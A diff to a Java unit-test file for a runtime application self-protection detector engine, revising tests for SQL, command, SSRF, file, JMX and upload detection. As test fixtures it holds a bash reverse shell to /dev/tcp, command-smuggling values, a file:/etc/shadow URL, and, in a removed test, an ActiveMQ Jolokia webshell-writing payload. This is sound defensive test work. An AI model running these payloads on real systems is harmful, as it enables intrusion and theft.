@@ -4,6 +4,7 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
+import io.ohmyrasp.agent.http.ArchiveUploadPolicy;
 import io.ohmyrasp.agent.model.Detection;
 import io.ohmyrasp.agent.model.RequestContext;
 import java.nio.charset.StandardCharsets;
@@ -81,15 +82,16 @@ final class DetectorEngineTest {
   void distinguishesConfiguredScopedAddressFromCopiedServiceUrl() {
     assertTrue(engine.detectUrl("http://[fe80::42%25eth0]/health", request()).isEmpty());
     String service = "http://inventory_api/records";
-    assertAlgorithm(engine.detectUrl(service, request(Map.of("url", List.of(service)))), "ssrf_userinput");
+    assertTrue(engine.detectUrl(service, request(Map.of("url", List.of(service)))).isEmpty());
+    assertAlgorithm(engine.detectUrl(service, request(Map.of("url", List.of(service))), true), "ssrf_userinput");
   }
 
   @Test
   void comparesSuppliedUrlAuthorityAndPath() {
-    var ctx = request(Map.of("endpoint", List.of("https://media.example:443/files")));
-    assertAlgorithm(engine.detectUrl("https://media.example/files/42", ctx), "ssrf_userinput");
-    assertTrue(engine.detectUrl("https://media.example/fileset/42", ctx).isEmpty());
-    assertTrue(engine.detectUrl("https://media.example:8443/files/42", ctx).isEmpty());
+    var ctx = request(Map.of("endpoint", List.of("https://10.1.2.3:443/files")));
+    assertAlgorithm(engine.detectUrl("https://10.1.2.3/files/42", ctx), "ssrf_userinput");
+    assertTrue(engine.detectUrl("https://10.1.2.3/fileset/42", ctx).isEmpty());
+    assertTrue(engine.detectUrl("https://10.1.2.3:8443/files/42", ctx).isEmpty());
     assertTrue(engine.detectUrl("https://media.example.test/files/42", ctx).isEmpty());
   }
 
@@ -133,6 +135,26 @@ final class DetectorEngineTest {
             "select table_name from information_schema.tables", "information_schema", request());
 
     assertAlgorithm(result, "sql_regex");
+  }
+
+  @ParameterizedTest
+  @ValueSource(strings = {
+      "select 'SQLJ.INSTALL_JAR( reference'",
+      "select 'RUNSCRIPT FROM https://docs.invalid/guide'",
+      "/* CREATE ALIAS in the ProcessBuilder manual */ select 7",
+      "CREATE ALIAS REPORT FOR 'java.lang.Math.abs'; select 'ProcessBuilder documentation'",
+      "values 'LANGUAGE JAVA EXTERNAL NAME'"
+  })
+  void keepsSqlDocumentationSeparateFromExecutableClauses(String sql) {
+    assertTrue(engine.detectSql(sql, request()).isEmpty());
+  }
+
+  @Test
+  void requiresTheSubmittedValueToSupplyAStatementBoundary() {
+    String query = "select 'catalog'; select 2";
+    assertTrue(engine.detectSql(query, request(Map.of("term", List.of("catalog")))).isEmpty());
+    assertAlgorithm(engine.detectSql(query, request(Map.of("term", List.of("; select 2")))), "sql_userinput");
+    assertTrue(engine.detectSql("select '; select 2'", request(Map.of("term", List.of("; select 2")))).isEmpty());
   }
 
   @Test
@@ -401,6 +423,17 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void separatesShellSourceFromProcessArguments() {
+    var input = request(Map.of("text", List.of("sales|sh", "O'Brien")));
+    assertTrue(engine.detectCommand(List.of("printf", "%s", "sales|sh"), input).isEmpty());
+    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf '%s' \"$1\"", "--", "O'Brien"), input).isEmpty());
+    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf '%s' 'sales|sh'; printf done"), input).isEmpty());
+    assertTrue(engine.detectCommand(List.of("sh", "-c", "printf ok | cat"), request()).isEmpty());
+    assertAlgorithm(engine.detectCommand(List.of("/usr/bin/env", "LC_ALL=C", "/bin/sh", "-lc",
+        "printf ok; date"), request(Map.of("job", List.of("date")))), "command_userinput");
+  }
+
+  @Test
   void detectsCommonDangerousCommand() {
     var result = engine.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());
 
@@ -410,9 +443,16 @@ final class DetectorEngineTest {
 
   @Test
   void detectsReflectiveCommandStack() {
+    var args = List.of("id");
+    var direct = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "java.lang.reflect.Method");
+    assertTrue(engine.detectCommand(args, request(), direct).isEmpty());
+    assertTrue(engine.detectCommand(args, request(), direct, true).orElseThrow().requiresExplicitRule());
+    var caller = List.of("java.lang.ProcessImpl", "java.lang.ProcessBuilder", "example.Report",
+        "java.lang.reflect.Method");
+    assertTrue(engine.detectCommand(args, request(), caller, true).isEmpty());
     var result =
         engine.detectCommand(
-            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"));
+            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"), true);
 
     assertAlgorithm(result, "command_reflect");
   }
@@ -453,6 +493,13 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void unrelatedExecutableListenerCanRunAnOrdinaryReportCommand() {
+    for (String owner : List.of("example.reports.RunExecutableListener", "example.Jobs$RunExecutableListener")) {
+      assertTrue(engine.detectCommand(List.of("/usr/bin/printf", "weekly"), request(), List.of(owner)).isEmpty());
+    }
+  }
+
+  @Test
   void detectsSolrCve201712629ConfiguredExecutableListenerCommandStack() {
     var result =
         engine.detectCommand(
@@ -473,8 +520,9 @@ final class DetectorEngineTest {
             List.of("sh", "-c", "touch /tmp/success"),
             RequestContext.empty(),
             List.of(
-                "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
-                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil"));
+                "java.lang.Runtime",
+                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil",
+                "org.apache.rocketmq.broker.filtersrv.FilterServerManager"));
 
     assertAlgorithm(result, "command_config_injection");
     assertEquals(
@@ -582,9 +630,11 @@ final class DetectorEngineTest {
                 List.of("admin")),
             Map.of("user-agent", "JUnit", "host", "interal"));
 
-    var result = engine.detectUrl(target, context);
+    assertTrue(engine.detectUrl(target, context).isEmpty());
+    var result = engine.detectUrl(target, context, true);
 
     assertAlgorithm(result, "ssrf_userinput");
+    assertTrue(result.orElseThrow().requiresExplicitRule());
     assertEquals("interal", result.orElseThrow().details().get("host"));
     assertEquals(target, result.orElseThrow().details().get("url"));
   }
@@ -706,6 +756,18 @@ final class DetectorEngineTest {
     var result = engine.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar", request());
 
     assertTrue(result.isEmpty());
+  }
+
+  @Test
+  void checksWhoSelectedALocalFileUrl() {
+    String appFile = "file:/srv/orders/lib/renderer.jar";
+    assertTrue(engine.detectUrl(appFile, request()).isEmpty());
+    assertAlgorithm(engine.detectUrl(appFile, request(Map.of("source", List.of("file:///srv/orders/lib/")))),
+        "ssrf_protocol");
+    assertAlgorithm(engine.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar",
+        request(Map.of("source", List.of("/usr/local/tomcat/lib/servlet-api.jar")))), "ssrf_protocol");
+    assertAlgorithm(engine.detectUrl("file://host.example.invalid/share/readme", request()), "ssrf_protocol");
+    assertAlgorithm(engine.detectUrl("file:/etc/shadow", request()), "ssrf_protocol");
   }
 
   @Test
@@ -839,60 +901,23 @@ final class DetectorEngineTest {
   }
 
   @Test
-  void detectsRequestTimeJmxScriptFileWriteInvocation() {
-    var result =
-        engine.detectJmxMBeanInvoke(
-            "jdk.management.jfr:type=FlightRecorder",
-            "copyTo",
-            List.of("42", "/opt/activemq/webapps/admin/shelljfr.jsp"),
-            request());
-
-    assertAlgorithm(result, "jmx_file_write");
-  }
-
-  @Test
-  void detectsActiveMqJolokiaLog4jConfigFileWrite() {
-    String config =
-        "<Configuration><Appenders><RollingRandomAccessFile name=\"RollingFile\" "
-            + "fileName=\"/opt/activemq/webapps/admin/shell.jsp\"/></Appenders></Configuration>";
-    String body =
-        "{\"type\":\"exec\","
-            + "\"mbean\":\"org.apache.logging.log4j2:type=LoggerContext,ctx=default\","
-            + "\"operation\":\"setConfigText\","
-            + "\"arguments\":[\""
-            + config.replace("\\", "\\\\").replace("\"", "\\\"")
-            + "\",\"utf-8\"]}";
-    RequestContext request =
-        new RequestContext(
-            "POST",
-            "/api/jolokia/",
-            "",
-            Map.of(),
-            Map.of("content-type", "application/json", "authorization", "Basic YWRtaW46YWRtaW4="),
-            body);
-
-    var result =
-        engine.detectJmxMBeanInvoke(
-            "org.apache.logging.log4j2:type=LoggerContext,ctx=default",
-            "setConfigText",
-            List.of(config, "utf-8"),
-            request);
-
-    assertAlgorithm(result, "jmx_file_write");
-    assertEquals("/api/jolokia/", result.orElseThrow().request().uri());
-    assertEquals("/opt/activemq/webapps/admin/shell.jsp", result.orElseThrow().details().get("path"));
-  }
-
-  @Test
-  void detectsRequestTimeJmxConfigTextScriptFileWriteInvocation() {
-    var result =
-        engine.detectJmxMBeanInvoke(
-            "org.apache.logging.log4j2:type=LoggerContext,ctx=default",
-            "setConfigText",
-            List.of("<File name=\"shell\" fileName=\"/opt/activemq/webapps/admin/shell.jsp\"/>"),
-            request());
-
-    assertAlgorithm(result, "jmx_file_write");
+  void correlatesManagedArgumentsWithAnObservedWrite() {
+    String selected = "/reports/weekly.jsp";
+    for (String argument : List.of(selected, "<report destination=\"" + selected + "\"/>")) {
+      io.ohmyrasp.agent.jmx.JmxWriteScope.enter();
+      try {
+        var values = List.of(argument);
+        io.ohmyrasp.agent.jmx.JmxWriteScope.select("reports:type=Writer", "publish", values);
+        assertTrue(engine.detectJmxMBeanInvoke("reports:type=Writer", "publish", values, request()).isEmpty());
+        var scope = io.ohmyrasp.agent.jmx.JmxWriteScope.current();
+        assertTrue(engine.detectJmxFileWrite("/reports/other.jsp", scope, "channel_open", request()).isEmpty());
+        var detection = engine.detectJmxFileWrite(selected, scope, "channel_open", request());
+        assertAlgorithm(detection, "jmx_file_write");
+        assertEquals("selected_write_open", detection.get().details().get("decision_basis"));
+      } finally {
+        io.ohmyrasp.agent.jmx.JmxWriteScope.exit();
+      }
+    }
   }
 
   @Test
@@ -1058,7 +1083,8 @@ final class DetectorEngineTest {
 
   @Test
   void detectsFileReadOutsideWebroot() {
-    var result = engine.detectFileRead("/etc/hosts", request(), false);
+    assertTrue(engine.detectFileRead("/etc/hosts", request(), false).isEmpty());
+    var result = engine.detectFileRead("/etc/hosts", request(), false, true);
 
     assertAlgorithm(result, "readFile_outsideWebroot");
   }
@@ -1088,6 +1114,15 @@ final class DetectorEngineTest {
 
     assertTrue(result.isPresent());
     assertEquals("writeFile_script", result.orElseThrow().algorithm());
+  }
+
+  @Test
+  void distinguishesDirectReflectiveWriteFromOrdinaryBackgroundWrite() {
+    String path = "/srv/app/views/order.jsp";
+    var ordinary = List.of("java.io.FileOutputStream", "app.Renderer", "java.lang.reflect.Method");
+    assertTrue(engine.detectFileWrite(path, RequestContext.empty(), ordinary).isEmpty());
+    var direct = List.of("java.io.FileOutputStream", "java.io.FileOutputStream", "java.lang.reflect.Constructor");
+    assertAlgorithm(engine.detectFileWrite(path, RequestContext.empty(), direct), "writeFile_reflect");
   }
 
   @Test
@@ -1137,6 +1172,19 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void distinguishesProgramOperationsFromTemporaryReportData() {
+    String op = "system(\"printf weekly\")";
+    var ctx = request(Map.of("label", List.of(op)));
+    assertTrue(engine.detectGeneratedScriptFileWrite("/tmp/report", "# " + op, ctx).isEmpty());
+    assertTrue(engine.detectGeneratedScriptFileWrite("/tmp/report", "title = '" + op + "'", ctx).isEmpty());
+    assertAlgorithm(engine.detectGeneratedScriptFileWrite("/tmp/report", "value = " + op, ctx), "writeFile_generated_script");
+    assertTrue(engine.detectGeneratedScriptFileWrite("/tmp/report", "label = 'North'\nvalue = " + op,
+        request(Map.of("label", List.of("North")))).isEmpty());
+    assertAlgorithm(engine.detectGeneratedScriptFileWrite("/tmp/report", "value = " + op,
+        request(Map.of("value", List.of("printf weekly")))), "writeFile_generated_script");
+  }
+
+  @Test
   void ignoresBenignGeneratedGnuplotScriptWrite() {
     var result =
         engine.detectGeneratedScriptFileWrite(
@@ -1177,6 +1225,18 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void distinguishesDeletePathControlFromAReportIdentifier() {
+    String absolute = "/srv/docs/report-10.txt";
+    assertTrue(engine.detectFileDelete(absolute, request(Map.of("week", List.of("10")))).isEmpty());
+    assertTrue(engine.detectFileDelete(absolute, request(Map.of("file", List.of("report-10.txt")))).isEmpty());
+    assertTrue(engine.detectFileDelete(absolute, request(Map.of("file", List.of(absolute)))).isEmpty());
+    String protectedEntry = "/srv/docs/WEB-INF/report.xml";
+    assertTrue(engine.detectFileDelete(protectedEntry, request(Map.of("file", List.of(protectedEntry)))).isEmpty());
+    assertTrue(engine.detectFileDelete("/srv/docs/../note.txt",
+        request(Map.of("file", List.of("../note.txt")))).isEmpty());
+  }
+
+  @Test
   void detectsArchiveTraversalExtraction() {
     var result =
         engine.detectArchiveExtraction(
@@ -1202,6 +1262,24 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void requiresAnEscapingMemberAndCorrespondingWritePath() {
+    for (String[] paths : new String[][] {
+        {"drafts/../report.txt", "/out/drafts/../report.txt"},
+        {"../out/report.txt", "/tmp/out/../out/report.txt"},
+        {"../report.txt", "/out/drafts/../report.txt.bak"},
+        {"../notes/report.txt", "/out/drafts/../report.txt"},
+        {"/notes/report.txt", "/out/notes/report.txt"},
+        {" ../report.txt", "/out/ ../report.txt"}
+    }) {
+      assertTrue(engine.detectArchiveExtraction(paths[0], paths[1], request()).isEmpty());
+    }
+    assertAlgorithm(engine.detectArchiveExtraction("..\\report.txt",
+        "/out/../report.txt", request()), "archive_traversal");
+    assertAlgorithm(engine.detectArchiveExtraction("drafts/../../report.txt",
+        "/out/drafts/../../report.txt", request()), "archive_traversal");
+  }
+
+  @Test
   void ignoresSanitizedArchiveTraversalEntry() {
     var result =
         engine.detectArchiveExtraction(
@@ -1223,25 +1301,22 @@ final class DetectorEngineTest {
     var scan = List.of("java.io.File", "org.apache.catalina.webresources.DirResourceSet",
         "org.apache.catalina.startup.ContextConfig", "java.lang.reflect.Method");
     assertTrue(engine.detectDirectoryList("/app/WEB-INF/classes", RequestContext.empty(), scan).isEmpty());
-    assertAlgorithm(engine.detectDirectoryList("/root", RequestContext.empty(), scan), "directory_unwanted");
+    assertTrue(engine.detectDirectoryList("/root", RequestContext.empty(), scan).isEmpty());
     var app = List.of("java.io.File", "example.Initializer",
         "org.apache.catalina.startup.ContextConfig", "java.lang.reflect.Method");
-    assertAlgorithm(engine.detectDirectoryList("/data", RequestContext.empty(), app), "directory_reflect");
+    assertTrue(engine.detectDirectoryList("/data", RequestContext.empty(), app).isEmpty());
+    var reflective = List.of("java.io.File", "java.lang.reflect.Method", "example.Initializer");
+    assertTrue(engine.detectDirectoryList("/data", RequestContext.empty(), reflective).isEmpty());
   }
 
   @Test
-  void detectsUnwantedDirectoryList() {
-    var result = engine.detectDirectoryList("/root", request());
-
-    assertAlgorithm(result, "directory_unwanted");
-  }
-
-  @Test
-  void detectsReflectiveDirectoryList() {
-    var result =
-        engine.detectDirectoryList("/tmp", request(), List.of("java.lang.reflect.Method"));
-
-    assertAlgorithm(result, "directory_reflect");
+  void fixedDirectoryLocationAndReflectionRequireExplicitRules() {
+    var stack = List.of("java.lang.reflect.Method");
+    assertTrue(engine.detectDirectoryList("/root", request(), stack).isEmpty());
+    var candidates = engine.directoryListings("/root", request(), null, false, false, false,
+        algorithm -> true, () -> stack);
+    assertEquals(List.of("directory_unwanted", "directory_reflect"), candidates.stream().map(Detection::algorithm).toList());
+    assertTrue(candidates.stream().allMatch(Detection::requiresExplicitRule));
   }
 
   @Test
@@ -1410,27 +1485,39 @@ final class DetectorEngineTest {
   }
 
   @Test
-  void detectsJavaArchivePluginUpload() {
-    var result = engine.detectFileUpload("Evil.jar", requestUri("/plugin/add"));
+  void collectsPluginUploadCandidateForManagedPolicy() {
+    var result = engine.detectFileUpload("Evil.jar", requestUri("/plugin/add"),
+            ArchiveUploadPolicy.Decision.UNSPECIFIED, true);
 
     assertAlgorithm(result, "fileUpload_java_archive");
   }
 
   @Test
-  void detectsJavaArchiveJarUpload() {
-    var result = engine.detectFileUpload("Exploit.jar", requestUri("/jars/upload"));
+  void collectsJarUploadCandidateForManagedPolicy() {
+    var result = engine.detectFileUpload("Exploit.jar", requestUri("/jars/upload"),
+            ArchiveUploadPolicy.Decision.UNSPECIFIED, true);
 
     assertAlgorithm(result, "fileUpload_java_archive");
   }
 
   @Test
-  void detectsJavaArchiveUploadByParameterContext() {
+  void collectsJarParameterCandidateForManagedPolicy() {
     var request =
         new RequestContext(
             "POST", "/upload", "", Map.of("jarfile", List.of("selected")), Map.of());
-    var result = engine.detectFileUpload("Exploit.jar", request);
+    var result = engine.detectFileUpload("Exploit.jar", request, ArchiveUploadPolicy.Decision.UNSPECIFIED, true);
 
     assertAlgorithm(result, "fileUpload_java_archive");
+  }
+
+  @Test
+  void archiveFilenameAloneDoesNotEstablishAuthorization() {
+    var request = requestUri("/plugin/add");
+    assertTrue(engine.detectFileUpload("release.jar", request).isEmpty());
+    assertTrue(engine.detectFileUpload("release.jar", request, ArchiveUploadPolicy.Decision.ALLOWED, false).isEmpty());
+    var denied = engine.detectFileUpload("release.jar", request, ArchiveUploadPolicy.Decision.ROLE_DENIED, false);
+    assertAlgorithm(denied, "fileUpload_java_archive");
+    assertEquals("required_role_denied", denied.orElseThrow().details().get("decision_basis"));
   }
 
   @Test
@@ -6505,7 +6592,8 @@ final class DetectorEngineTest {
             Map.of("user-agent", "JUnit", "content-type", "application/json"),
             body);
 
-    var result = engine.detectRequest(context);
+    assertTrue(engine.detectRequest(context).isEmpty());
+    var result = engine.sqlRequestMetadata(context, "request_sql_sort_injection"::equals).stream().findFirst();
 
     assertAlgorithm(result, "request_sql_sort_injection");
     assertEquals("type", result.orElseThrow().details().get("field"));
@@ -6533,7 +6621,8 @@ final class DetectorEngineTest {
             Map.of("user-agent", "JUnit", "content-type", "application/json"),
             body);
 
-    var result = engine.detectRequest(context);
+    assertTrue(engine.detectRequest(context).isEmpty());
+    var result = engine.sqlRequestMetadata(context, "request_sql_identifier_injection"::equals).stream().findFirst();
 
     assertAlgorithm(result, "request_sql_identifier_injection");
     assertEquals("metricName", result.orElseThrow().details().get("field"));
